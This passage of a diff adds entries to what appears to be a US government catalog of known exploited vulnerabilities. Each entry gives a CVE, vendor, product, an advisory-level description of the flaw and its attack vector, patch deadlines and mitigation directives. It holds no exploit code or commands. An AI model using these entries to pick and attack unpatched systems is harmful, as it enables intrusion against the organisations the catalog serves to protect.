+      "name": "SimpleHelp Authentication Bypass Vulnerability",
+      "description": "SimpleHelp contains an authentication bypass vulnerability in the OIDC authentication flow. When OIDC authentication is configured, identity tokens submitted during login are accepted without verifying their cryptographic signature. In a vulnerable configuration, a remote, unauthenticated attacker can submit a forged token containing arbitrary identity claims to obtain a fully authenticated technician session. In some configurations, this may also allow bypass of multi-factor authentication.",
+      "date_added": "2026-06-29",
+      "due_date": "2026-07-02",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-12569",
+      "vendor": "PTC",
+      "product": "Windchill and FlexPLM",
+      "name": "PTC Windchill and FlexPLM Improper Input Validation Vulnerability",
+      "description": "PTC Windchill and FlexPLM contains an improper input validation vulnerability allowing an unauthenticated, remote attacker to execute arbitrary code by sending a malicious request to the network.",
+      "date_added": "2026-06-25",
+      "due_date": "2026-06-28",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-20230",
+      "vendor": "Cisco",
+      "product": "Unified Communications Manager",
+      "name": "Cisco Unified Communications Manager Server-Side Request Forgery (SSRF) Vulnerability",
+      "description": "Cisco Unified Communications Manager (Unified CM) and Cisco Unified Communications Manager Session Management Edition (Unified CM SME) contain a server-side request forgery (SSRF) Vulnerability that could allow an unauthenticated, remote attacker to write files to the underlying operating system that could be used later to elevate to root.",
+      "date_added": "2026-06-25",
+      "due_date": "2026-06-28",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2025-67038",
+      "vendor": "Lantronix",
+      "product": "EDS5000",
+      "name": "Lantronix EDS5000 Code Injection Vulnerability",
+      "description": "Lantronix EDS5000 contains a code injection vulnerability that could allow attackers to inject arbitrary OS commands into the username parameter. Injected commands are executed with root privileges.",
+      "date_added": "2026-06-23",
+      "due_date": "2026-06-26",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-34910",
+      "vendor": "Ubiquiti",
+      "product": "UniFi OS",
+      "name": "Ubiquiti UniFi OS Improper Input Validation Vulnerability",
+      "description": "Ubiquiti UniFi OS contains an improper input validation vulnerability which could allow a malicious actor with access to the network to conduct command injection.",
+      "date_added": "2026-06-23",
+      "due_date": "2026-06-26",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-34909",
+      "vendor": "Ubiquiti",
+      "product": "UniFi OS",
+      "name": "Ubiquiti UniFi OS Path Traversal Vulnerability",
+      "description": "Ubiquiti UniFi OS contains a path traversal vulnerability which could allow a malicious actor with access to the network to access files on the underlying system that could be manipulated to access an underlying account.",
+      "date_added": "2026-06-23",
+      "due_date": "2026-06-26",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-34908",
+      "vendor": "Ubiquiti",
+      "product": "UniFi OS",
+      "name": "Ubiquiti UniFi OS Improper Access Control Vulnerability",
+      "description": "Ubiquiti UniFi OS contains an improper access control vulnerability which could allow a malicious actor with access to the network to make unauthorized changes to the system.",
+      "date_added": "2026-06-23",
+      "due_date": "2026-06-26",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-20253",
+      "vendor": "Splunk",
+      "product": "Enterprise",
+      "name": "Splunk Enterprise Missing Authentication for Critical Function Vulnerability",
+      "description": "Splunk Enterprise contains a missing authentication for critical function vulnerability which could allow an unauthenticated user to create or truncate arbitrary files through a PostgreSQL sidecar service endpoint.",
+      "date_added": "2026-06-18",
+      "due_date": "2026-06-21",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-48907",
+      "vendor": "Widget Factory",
+      "product": "Joomla Content Editor ",
+      "name": "Widget Factory Joomla Content Editor Improper Access Control Vulnerability",
+      "description": "Widget Factory Joomla Content Editor contains an improper access control vulnerability which could allow for upload and execution of PHP code via the creation of new editor profiles for unauthenticated users. ",
+      "date_added": "2026-06-16",
+      "due_date": "2026-06-19",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-54420",
+      "vendor": "LiteSpeed",
+      "product": "cPanel Plugin",
+      "name": "LiteSpeed cPanel Plugin UNIX Symbolic Link (Symlink) Following Vulnerability",
+      "description": "LiteSpeed cPanel plugin contains a UNIX symbolic link (Symlink) following vulnerability that could allow a user with FTP or web shell access on a shared hosting server running CloudLinux/CageFS.",
+      "date_added": "2026-06-15",
+      "due_date": "2026-06-18",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-20262",
+      "vendor": "Cisco",
+      "product": "Catalyst SD-WAN Manager",
+      "name": "Cisco Catalyst SD-WAN Manager Directory or Path Traversal Vulnerability",
+      "description": "Cisco Catalyst SD-WAN Manager contains a directory or path traversal vulnerability that could allow an authenticated, remote attacker to create a file or overwrite any file on the filesystem of an affected system.",
+      "date_added": "2026-06-15",
+      "due_date": "2026-06-29",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-35273",
+      "vendor": "Oracle",
+      "product": " PeopleSoft Enterprise PeopleTools",
+      "name": "Oracle PeopleSoft Enterprise PeopleTools Missing Authentication for Critical Function Vulnerability",
+      "description": "Oracle PeopleSoft Enterprise PeopleTools contains a missing authentication for critical function vulnerability which could allow an unauthenticated attacker to obtain takeover of PeopleSoft Enterprise PeopleTools.",
+      "date_added": "2026-06-12",
+      "due_date": "2026-06-15",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Known"
+    },
+    {
+      "cve_id": "CVE-2026-10520",
+      "vendor": "Ivanti",
+      "product": "Sentry",
+      "name": "Ivanti Sentry OS Command Injection Vulnerability",
+      "description": "Ivanti Sentry (formerly known as MobileIron Sentry) contains an OS command injection vulnerability which could allow a remote unauthenticated user to achieve root-level remote code execution. This vulnerability can be successfully exploited in cases where the Sentry appliance is in an unmanaged state with its endpoints externally reachable. The use of mTLS with EPMM or restricted HTTPS access through Neurons for MDM makes interfaces inaccessible to external actors.",
+      "date_added": "2026-06-11",
+      "due_date": "2026-06-14",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-11645",
+      "vendor": "Google",
+      "product": "Chromium V8",
+      "name": "Google Chromium V8 Out-of-Bounds Read and Write Vulnerability",
+      "description": "Google Chromium V8 out-of-bounds read and write vulnerability that could allow a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page. This vulnerability could affect multiple web browsers that utilize Chromium, including, but not limited to, Google Chrome, Microsoft Edge, and Opera.",
+      "date_added": "2026-06-09",
+      "due_date": "2026-06-23",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-7473",
+      "vendor": "Arista",
+      "product": "Extensible Operating System",
+      "name": "Arista Extensible Operating System Incomplete Comparison with Missing Factors Vulnerability",
+      "description": "Arista Extensible Operating System (EOS) contains an incomplete comparison with missing factors vulnerability when the switch incorrectly decapsulate and forwards other unexpected tunneled packet with a destination IP matching its configured decapsulation IP.",
+      "date_added": "2026-06-09",
+      "due_date": "2026-06-23",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-20245",
+      "vendor": "Cisco",
+      "product": "Catalyst SD-WAN Manager",
+      "name": "Cisco Catalyst SD-WAN Manager Improper Encoding or Escaping of Output Vulnerability",
+      "description": "Cisco Catalyst SD-WAN Manager formerly SD-WAN vManage contains an improper encoding or escaping of output vulnerability. This vulnerability could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.",
+      "date_added": "2026-06-09",
+      "due_date": "2026-06-23",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-42271",
+      "vendor": "BerriAI",
+      "product": "LiteLLM",
+      "name": "BerriAI LiteLLM Command Injection Vulnerability",
+      "description": "BerriAI LiteLLM contains a command injection vulnerability that could allow any authenticated user, including holders of low-privilege internal-user keys, to run arbitrary commands on the host.",
+      "date_added": "2026-06-08",
+      "due_date": "2026-06-22",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-50751",
+      "vendor": "Check Point",
+      "product": "Security Gateway",
+      "name": "Check Point Security Gateway Improper Authentication Vulnerability",
+      "description": "Check Point Security Gateway contains an improper authentication vulnerability in IKEv1 key exchange that could allow an unauthenticated remote attacker to bypass user authentication and establish a remote access VPN connection without a valid user password.",
+      "date_added": "2026-06-08",
+      "due_date": "2026-06-11",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Known"
+    },
+    {
+      "cve_id": "CVE-2026-28318",
+      "vendor": "SolarWinds",
+      "product": "Serv-U",
+      "name": "SolarWinds Serv-U Uncontrolled Resource Consumption Vulnerability",
+      "description": "SolarWinds Serv-U contains an uncontrolled resource consumption vulnerability that allows specially crafted POST requests using the Content-Encoding: deflate header to crash the Serv-U service without authentication.",
+      "date_added": "2026-06-05",
+      "due_date": "2026-06-19",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-45247",
+      "vendor": "Mirasvit",
+      "product": "Mirasvit Full Page Cache Warmer",
+      "name": "Mirasvit Full Page Cache Warmer Deserialization of Untrusted Data Vulnerability",
+      "description": "Mirasvit Full Page Cache Warmer contains a deserialization of untrusted data vulnerability that could allow unauthenticated attackers to achieve remote code execution by supplying a crafted serialized PHP object in the CacheWarmer cookie.",
+      "date_added": "2026-06-03",
+      "due_date": "2026-06-06",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2022-0492",
+      "vendor": "Linux",
+      "product": "Kernel",
+      "name": "Linux Kernel Improper Authentication Vulnerability",
+      "description": "Linux Kernel contains an improper authentication vulnerability which could allow for privilege escalation via the cgroups v1 release_agent feature.",
+      "date_added": "2026-06-02",
+      "due_date": "2026-06-05",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2025-48595",
+      "vendor": "Android",
+      "product": "Framework",
+      "name": "Android Framework Integer Overflow Vulnerability",
+      "description": "Android Framework contains an integer overflow vulnerability that allows for code execution that could allow for local privilege escalation.",
+      "date_added": "2026-06-02",
+      "due_date": "2026-06-05",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2024-21182",
+      "vendor": "Oracle",
+      "product": "WebLogic Server",
+      "name": "Oracle WebLogic Server Unspecified Vulnerability",
+      "description": "Oracle WebLogic contains an unspecified vulnerability that could allow an unauthenticated attacker with network access via T3, IIOP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data.",
+      "date_added": "2026-06-01",
+      "due_date": "2026-06-04",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-0257",
+      "vendor": "Palo Alto Networks",
+      "product": "PAN-OS",
+      "name": "Palo Alto Networks PAN-OS Authentication Bypass Vulnerability",
+      "description": "Palo Alto Networks PAN-OS contains an authentication bypass vulnerability that allows attackers to bypass security restrictions and establish an unauthorized VPN connection.",
+      "date_added": "2026-05-29",
+      "due_date": "2026-06-01",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-48027",
+      "vendor": "Nx",
+      "product": "Nx Console",
+      "name": "Nx Console Embedded Malicious Code Vulnerability",
+      "description": "Nx Console contains an embedded malicious code vulnerability that allowed a malicious version of Nx Console to be published. The compromised extension fetched an obfuscated payload that could harvested credentials from multiple sources on disk and in memory.",
+      "date_added": "2026-05-27",
+      "due_date": "2026-06-10",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Known"
+    },
+    {
+      "cve_id": "CVE-2026-45321",
+      "vendor": "TanStack",
+      "product": "TanStack",
+      "name": "TanStack Unspecified Vulnerability",
+      "description": "TanStack contains an unspecified vulnerability that allowed malicious versions of the product to be published to the npm registry to publish credential-stealing malware under a trusted identity.",
+      "date_added": "2026-05-27",
+      "due_date": "2026-06-10",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Known"
+    },
+    {
+      "cve_id": "CVE-2026-8398",
+      "vendor": "Daemon",
+      "product": "Daemon Tools Lite",
+      "name": "Daemon Tools Lite Embedded Malicious Code Vulnerability",
+      "description": "Daemon Tools contains an unspecified vulnerability that has a high impact on confidentiality, integrity, and availability.",
+      "date_added": "2026-05-27",
+      "due_date": "2026-05-30",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-48172",
+      "vendor": "LiteSpeed",
+      "product": "cPanel Plugin",
+      "name": "LiteSpeed cPanel Plugin Privilege Escalation Vulnerability",
+      "description": "LiteSpeed cPanel Plugin contains privilege escalation vulnerability that is exposed via the user-end cPanel plugin, which can be abused by any cPanel user account to execute arbitrary scripts with root privileges.",
+      "date_added": "2026-05-26",
+      "due_date": "2026-05-29",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-9082",
+      "vendor": "Drupal",
+      "product": "Core",
+      "name": "Drupal Core SQL Injection Vulnerability",
+      "description": "Drupal Core contains a SQL injection vulnerability that could allow for privilege escalation and remote code execution via specially crafted requests sent with the database abstraction API.",
+      "date_added": "2026-05-22",
+      "due_date": "2026-05-27",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2025-34291",
+      "vendor": "Langflow",
+      "product": "Langflow",
+      "name": "Langflow Origin Validation Error Vulnerability",
+      "description": "Langflow contains an origin validation error vulnerability in which an overly permissive CORS configuration combined with a refresh token cookie configured as SameSite=None allows a malicious webpage to perform cross-origin requests that include credentials and successfully call the refresh endpoint. This could allow the attacker to execute arbitrary code and achieve full system compromise via obtained tokens that permit access to authenticated endpoints.",
+      "date_added": "2026-05-21",
+      "due_date": "2026-06-04",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-34926",
+      "vendor": "Trend Micro",
+      "product": "Apex One",
+      "name": "Trend Micro Apex One (On-Premise) Directory Traversal Vulnerability",
+      "description": "Trend Micro Apex One (on-premise) contains a directory traversal vulnerability that could allow a pre-authenticated local attacker to modify a key table on the server to inject malicious code to deploy to agents on affected installations.",
+      "date_added": "2026-05-21",
+      "due_date": "2026-06-04",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2008-4250",
+      "vendor": "Microsoft",
+      "product": "Windows",
+      "name": "Microsoft Windows Buffer Overflow Vulnerability",
+      "description": "Microsoft Windows contains a buffer overflow vulnerability in the Windows Server Service that allows remote attackers to execute arbitrary code via a crafted RPC request that triggers an overflow during path canonicalization.",
+      "date_added": "2026-05-20",
+      "due_date": "2026-06-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2009-1537",
+      "vendor": "Microsoft",
+      "product": "DirectX",
+      "name": "Microsoft DirectX NULL Byte Overwrite Vulnerability",
+      "description": "Microsoft DirectX contains a NULL byte overwrite vulnerability in the QuickTime Movie Parser Filter in quartz.dll in DirectShow which could allow remote attackers to execute arbitrary code via a crafted QuickTime media file.",
+      "date_added": "2026-05-20",
+      "due_date": "2026-06-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2009-3459",
+      "vendor": "Adobe",
+      "product": "Acrobat and Reader",
+      "name": "Adobe Acrobat and Reader Heap-Based Buffer Overflow Vulnerability",
+      "description": "Adobe Acrobat and Reader contain a heap-based buffer overflow vulnerability which could allow remote attackers to execute arbitrary code via a crafted PDF file that triggers memory corruption.",
+      "date_added": "2026-05-20",
+      "due_date": "2026-06-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2010-0249",
+      "vendor": "Microsoft",
+      "product": "Internet Explorer",
+      "name": "Microsoft Internet Explorer Use-After-Free Vulnerability",
+      "description": "Microsoft Internet Explorer contains an use-after-free vulnerability that could allow remote attackers to execute arbitrary code by accessing a pointer associated with a deleted object. The impacted product could be end-of-life (EoL) and/or end-of-service (EoS). Users should discontinue product utilization.",
+      "date_added": "2026-05-20",
+      "due_date": "2026-06-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2010-0806",
+      "vendor": "Microsoft",
+      "product": "Internet Explorer",
+      "name": "Microsoft Internet Explorer Use-After-Free Vulnerability",
+      "description": "Microsoft Internet Explorer contains an use-after-free vulnerability that could allow remote attackers to execute arbitrary code via vectors involving access to an invalid pointer after the deletion of an object. The impacted product could be end-of-life (EoL) and/or end-of-service (EoS). Users should discontinue product utilization.",
+      "date_added": "2026-05-20",
+      "due_date": "2026-06-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-41091",
+      "vendor": "Microsoft",
+      "product": "Defender",
+      "name": "Microsoft Defender Link Following Vulnerability",
+      "description": "Microsoft Defender contains a link following vulnerability that allows an authorized attacker to elevate privileges locally.",
+      "date_added": "2026-05-20",
+      "due_date": "2026-06-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-45498",
+      "vendor": "Microsoft",
+      "product": "Defender",
+      "name": "Microsoft Defender Denial of Service Vulnerability",
+      "description": "Microsoft Defender contains an unspecified vulnerability that allows for denial of service.",
+      "date_added": "2026-05-20",
+      "due_date": "2026-06-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-42897",
+      "vendor": "Microsoft",
+      "product": "Microsoft",
+      "name": "Microsoft Exchange Server Cross-Site Scripting Vulnerability",
+      "description": "Microsoft Exchange Server contains a cross-site scripting vulnerability during web page generation in Outlook Web Access and when certain interaction conditions are met, arbitrary JavaScript can be executed in the browser context.",
+      "date_added": "2026-05-15",
+      "due_date": "2026-05-29",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-20182",
+      "vendor": "Cisco",
+      "product": "Catalyst SD-WAN",
+      "name": "Cisco Catalyst SD-WAN Controller Authentication Bypass Vulnerability",
+      "description": "Cisco Catalyst SD-WAN Controller & Manager contain an authentication bypass vulnerability that allows an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges on an affected system.",
+      "date_added": "2026-05-14",
+      "due_date": "2026-05-17",
+      "required_action": "Please adhere to CISA’s guidelines to assess exposure and mitigate risks associated with Cisco SD-WAN devices as outlined in CISA’s Emergency Directive 26-03 (URL listed below in Notes) and CISA’s Hunt & Hardening Guidance for Cisco SD-WAN Devices (URL listed below in Notes). Adhere to the applicable BOD 22-01 guidance for cloud services or discontinue use of the product if mitigations are not available.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-42208",
+      "vendor": "BerriAI",
+      "product": "LiteLLM",
+      "name": "BerriAI LiteLLM SQL Injection Vulnerability",
+      "description": "BerriAI LiteLLM contains a SQL injection vulnerability that allows an attacker to read data from the proxy's database and potentially modify it, leading to unauthorized access to the proxy and the credentials it manages.",
+      "date_added": "2026-05-08",
+      "due_date": "2026-05-11",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-6973",
+      "vendor": "Ivanti",
+      "product": "Endpoint Manager Mobile (EPMM)",
+      "name": "Ivanti Endpoint Manager Mobile (EPMM) Improper Input Validation Vulnerability",
+      "description": "Ivanti Endpoint Manager Mobile (EPMM) contains an improper input validation vulnerability that allows a remotely authenticated user with administrative access to achieve remote code execution.",
+      "date_added": "2026-05-07",
+      "due_date": "2026-05-10",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-0300",
+      "vendor": "Palo Alto Networks",
+      "product": "PAN-OS",
+      "name": "Palo Alto Networks PAN-OS Out-of-bounds Write Vulnerability",
+      "description": "Palo Alto Networks PAN-OS contains an out-of-bounds write vulnerability in the User-ID Authentication Portal (aka Captive Portal) service that can allow an unauthenticated attacker to execute arbitrary code with root privileges on the PA-Series and VM-Series firewalls by sending specially crafted packets.",
+      "date_added": "2026-05-06",
+      "due_date": "2026-05-09",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable. Until the vendor releases an official fix, the following workaround should be implemented:  - Restrict User-ID Authentication Portal access to only trusted zones.  - Disable User-ID Authentication Portal if not required. 5/13/2026: Palo Alto has released a variety of patches. If these are relevant to your environment, please apply the designated patch.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-31431",
+      "vendor": "Linux",
+      "product": "Kernel",
+      "name": "Linux Kernel Incorrect Resource Transfer Between Spheres Vulnerability",
+      "description": "Linux Kernel contains an incorrect resource transfer between spheres vulnerability that could allow for privilege escalation.",
+      "date_added": "2026-05-01",
+      "due_date": "2026-05-15",
+      "required_action": "\"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-41940",
+      "vendor": "WebPros",
+      "product": "cPanel & WHM and WP2 (WordPress Squared)",
+      "name": "WebPros cPanel & WHM and WP2 (WordPress Squared) Missing Authentication for Critical Function Vulnerability",
+      "description": "WebPros cPanel & WHM (WebHost Manager) and WP2 (WordPress Squared) contain an authentication bypass vulnerability in the login flow that allows unauthenticated remote attackers to gain unauthorized access to the control panel.",
+      "date_added": "2026-04-30",
